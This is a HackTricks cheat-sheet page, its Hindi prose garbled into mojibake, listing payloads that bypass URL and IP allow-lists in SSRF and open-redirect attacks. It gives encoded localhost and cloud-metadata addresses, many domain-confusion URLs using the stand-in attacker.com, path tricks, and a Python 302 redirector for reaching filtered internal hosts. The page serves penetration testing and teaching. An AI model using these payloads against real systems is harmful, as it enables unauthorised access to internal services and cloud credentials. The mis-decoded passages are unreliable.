# URL Format Bypass

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

рджреВрд╕рд░реЗ рддрд░реАрдХреЗ HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдЕрдЧрд░ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рдЧреНрд░реБрдк**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рдЧреНрд░реБрдк**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

### Localhost
```bash
# Localhost
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:22
http://127.1:80
http://127.000000000000000.1
http://0
http:@0/ --> http://localhost/
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://[::]:25/ SMTP
http://[::]:3128/ Squid
http://[0000::1]:80/
http://[0:0:0:0:0:ffff:127.0.0.1]/thefile
http://тСатСбтСж.тУк.тУк.тУк

# CDIR bypass
http://127.127.127.127
http://127.0.1.3
http://127.0.0.0

# Dot bypass
127уАВ0уАВ0уАВ1
127%E3%80%820%E3%80%820%E3%80%821

# Decimal bypass
http://2130706433/ = http://127.0.0.1
http://3232235521/ = http://192.168.0.1
http://3232235777/ = http://192.168.1.1

# Octal Bypass
http://0177.0000.0000.0001
http://00000177.00000000.00000000.00000001
http://017700000001

# Hexadecimal bypass
127.0.0.1 = 0x7f 00 00 01
http://0x7f000001/ = http://127.0.0.1
http://0xc0a80014/ = http://192.168.0.20
0x7f.0x00.0x00.0x01
0x0000007f.0x00000000.0x00000000.0x00000001

# Add 0s bypass
127.000000000000.1

# You can also mix different encoding formats
# https://www.silisoftware.com/tools/ipconverter.php

# Malformed and rare
localhost:+11211aaa
localhost:00011211aaaa
http://0/
http://127.1
http://127.0.1

# DNS to localhost
localtest.me = 127.0.0.1
customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1
mail.ebc.apple.com = 127.0.0.6 (localhost)
127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)
www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://bugbounty.dod.network = 127.0.0.2 (localhost)
1ynrnhl.xip.io == 169.254.169.254
spoofed.burpcollaborator.net = 127.0.0.1
```
![](<../../.gitbook/assets/image (649) (1) (1).png>)

**Burp рдПрдХреНрд╕рдЯреЗрдВрд╢рди** [**Burp-Encode-IP**](https://github.com/e1abrador/Burp-Encode-IP) IP рдлреЙрд░реНрдореЗрдЯрд┐рдВрдЧ рдмрд╛рдпрдкрд╛рд╕ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддрд╛ рд╣реИред

### рдбреЛрдореЗрди рдкрд╛рд░реНрд╕рд░
```bash
https:attacker.com
https:/attacker.com
http:/\/\attacker.com
https:/\attacker.com
//attacker.com
\/\/attacker.com/
/\/attacker.com/
/attacker.com
%0D%0A/attacker.com
#attacker.com
#%20@attacker.com
@attacker.com
http://169.254.1698.254\@attacker.com
attacker%00.com
attacker%E3%80%82com
attackerуАВcom
тТ╢тУЙтУЙтТ╢тТ╕тУАтТ║тУб.тТ╕тУЮтУЬ
```

```
тСа тСб тСв тСг тСд тСе тСж тСз тСи тСй тСк тСл тСм тСн тСо тСп тС░ тС▒ тС▓ тС│ тС┤ тС╡ тС╢ тС╖ тС╕ тС╣ тС║ тС╗ тС╝ тС╜ тС╛
тС┐ тТА тТБ тТВ тТГ тТД тТЕ тТЖ тТЗ тТИ тТЙ тТК тТЛ тТМ тТН тТО тТП тТР тТС тТТ тТУ тТФ тТХ тТЦ тТЧ
тТШ тТЩ тТЪ тТЫ тТЬ тТЭ тТЮ тТЯ тТа тТб тТв тТг тТд тТе тТж тТз тТи тТй тТк тТл тТм тТн тТо тТп тТ░
тТ▒ тТ▓ тТ│ тТ┤ тТ╡ тТ╢ тТ╖ тТ╕ тТ╣ тТ║ тТ╗ тТ╝ тТ╜ тТ╛ тТ┐ тУА тУБ тУВ тУГ тУД тУЕ тУЖ тУЗ тУИ тУЙ
тУК тУЛ тУМ тУН тУО тУП тУР тУС тУТ тУУ тУФ тУХ тУЦ тУЧ тУШ тУЩ тУЪ тУЫ тУЬ тУЭ тУЮ тУЯ тУа тУб тУв
тУг тУд тУе тУж тУз тУи тУй тУк тУл тУм тУн тУо тУп тУ░ тУ▒ тУ▓ тУ│ тУ┤ тУ╡ тУ╢ тУ╖ тУ╕ тУ╣ тУ║ тУ╗ тУ╝ тУ╜ тУ╛ тУ┐
```
### рдбреЛрдореЗрди рднреНрд░рд╛рдВрддрд┐
```bash
# Try also to change attacker.com for 127.0.0.1 to try to access localhost
# Try replacing https by http
# Try URL-encoded characters
https://{domain}@attacker.com
https://{domain}.attacker.com
https://{domain}%6D@attacker.com
https://attacker.com/{domain}
https://attacker.com/?d={domain}
https://attacker.com#{domain}
https://attacker.com@{domain}
https://attacker.com#@{domain}
https://attacker.com%23@{domain}
https://attacker.com%00{domain}
https://attacker.com%0A{domain}
https://attacker.com?{domain}
https://attacker.com///{domain}
https://attacker.com\{domain}/
https://attacker.com;https://{domain}
https://attacker.com\{domain}/
https://attacker.com\.{domain}
https://attacker.com/.{domain}
https://attacker.com\@@{domain}
https://attacker.com:\@@{domain}
https://attacker.com#\@{domain}
https://attacker.com\anything@{domain}/
https://www.victim.com(\u2044)some(\u2044)path(\u2044)(\u0294)some=param(\uff03)hash@attacker.com

# On each IP position try to put 1 attackers domain and the others the victim domain
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/

#Parameter pollution
next={domain}&next=attacker.com
```
### рдкрде рдФрд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдмрд╛рдпрдкрд╛рд╕

рдпрджрд┐ рдЖрдкрдХреЛ рдпрд╣ рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдХрд┐ URL рдХрд╛ рдЕрдВрдд рдПрдХ рдкрде рдпрд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдореЗрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рдпрд╛ URL рдореЗрдВ рдПрдХ рдкрде рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдмрд╛рдпрдкрд╛рд╕ рдореЗрдВ рд╕реЗ рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
https://metadata/vulerable/path#/expected/path
https://metadata/vulerable/path#.extension
https://metadata/expected/path/..%2f..%2f/vulnerable/path
```
### рдлрдЬрд╝рд┐рдВрдЧ

рдпрд╣ рдЯреВрд▓ [**recollapse**](https://github.com/0xacb/recollapse) рдПрдХ рджрд┐рдП рдЧрдП рдЗрдирдкреБрдЯ рд╕реЗ рд╡рд┐рднрд┐рдиреНрдирддрд╛рдПрдБ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЧрдП рд░реЗрдЬреЗрдХреНрд╕ рдХреЛ рдЫрд▓рдирд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред [**рдЗрд╕ рдкреЛрд╕реНрдЯ**](https://0xacb.com/2022/11/21/recollapse/) рдХреЛ рднреА рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВред

### рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдмрд╛рдпрдкрд╛рд╕

рд╕рдВрднрд╛рд╡рд┐рдд рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ **рдореВрд▓ рдЕрдиреБрд░реЛрдз рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд░ рд░рд╣рд╛ рд╣реЛ** рдПрдХ SSRF рдХрд╛ **рд▓реЗрдХрд┐рди рдирд╣реАрдВ** рдЙрд╕ рдЕрдиреБрд░реЛрдз рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╛рд╡рд┐рдд **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ред\
рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рд╕рд░реНрд╡рд░ рдЬреЛ SSRF рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╡рдВрд▓рд░рдмрд▓ рд╣реИ: `url=https://www.google.com/` рдореЗрдВ **url рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд░ рд░рд╣рд╛ рд╣реЛ**ред рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк [python рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ 302 рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рд╕рд╛рдж рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ](https://pastebin.com/raw/ywAUhFrv) рдЬрд╣рд╛рдБ рдЖрдк рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдП рдЧрдП IP рдкрддреЛрдВ** рдЬреИрд╕реЗ 127.0.0.1 рдпрд╛ рдлрд┐рд▓реНрдЯрд░ рдХрд┐рдП рдЧрдП **рдкреНрд░реЛрдЯреЛрдХреЙрд▓** рдЬреИрд╕реЗ gopher рддрдХ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
[рдЗрд╕ рд░рд┐рдкреЛрд░реНрдЯ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВред](https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530)
```python
#!/usr/bin/env python3

#python3 ./redirector.py 8000 http://127.0.0.1/

import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 2:
print("Usage: {} <port_number> <url>".format(sys.argv[0]))
sys.exit()

class Redirect(BaseHTTPRequestHandler):
def do_GET(self):
self.send_response(302)
self.send_header('Location', sys.argv[2])
self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```
## рд╕рдордЭрд╛рдП рдЧрдП рддрд░реАрдХреЗ

### рдХрд╛рд▓рд╛-рд╢реАрд░реНрд╖рдХ-рдЯреНрд░рд┐рдХ

_рдмреИрдХрд╕реНрд▓реИрд╢-рдЯреНрд░рд┐рдХ_ [WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing) рдФрд░ [RFC3986](https://datatracker.ietf.org/doc/html/rfc3986#appendix-B) рдХреЗ рдмреАрдЪ рдПрдХ рдЕрдВрддрд░ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рддреА рд╣реИред рдЬрдмрдХрд┐ RFC3986 рдПрдХ URI рдХреЗ рд▓рд┐рдП рд╕рд╛рдорд╛рдиреНрдп рдврд╛рдВрдЪрд╛ рд╣реИ, WHATWG рд╡реЗрдм URL рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖ рд╣реИ рдФрд░ рдЖрдзреБрдирд┐рдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░реНрд╕ рджреНрд╡рд╛рд░рд╛ рдЕрдкрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИред рдореБрдЦреНрдп рднрд┐рдиреНрдирддрд╛ WHATWG рдорд╛рдирдХ рдореЗрдВ рдмреИрдХрд╕реНрд▓реИрд╢ (`\`) рдХреЛ рдЖрдЧреЗ рдХреА рддрд░рдл рд╕реНрд▓реИрд╢ (`/`) рдХреЗ рд╕рдорд╛рди рдорд╛рдирдиреЗ рдореЗрдВ рд╣реИ, рдпрд╣ URL рдХреИрд╕реЗ рдкрд╛рд░реНрд╕ рд╣реЛрддреЗ рд╣реИрдВ рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╣реЛрд╕реНрдЯрдирд╛рдо рд╕реЗ рдкрде рдореЗрдВ рдПрдХ URL рдореЗрдВ рд╕рдВрдХреЗрддрд┐рдд рдХрд░рддрд╛ рд╣реИред

![https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec\_difference.jpg](https://bugs.xdavidhu.me/assets/posts/2021-12-30-fixing-the-unfixable-story-of-a-google-cloud-ssrf/spec\_difference.jpg)

### рдЕрдиреНрдп рднреНрд░рд╛рдВрддрд┐рдпрд╛рдБ

![https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](<../../.gitbook/assets/image (629).png>)

рдЫрд╡рд┐ [https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/](https://claroty.com/2022/01/10/blog-research-exploiting-url-parsing-confusion/)

## рд╕рдВрджрд░реНрдн

* [https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25](https://as745591.medium.com/albussec-penetration-list-08-server-side-request-forgery-ssrf-sample-90267f095d25)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
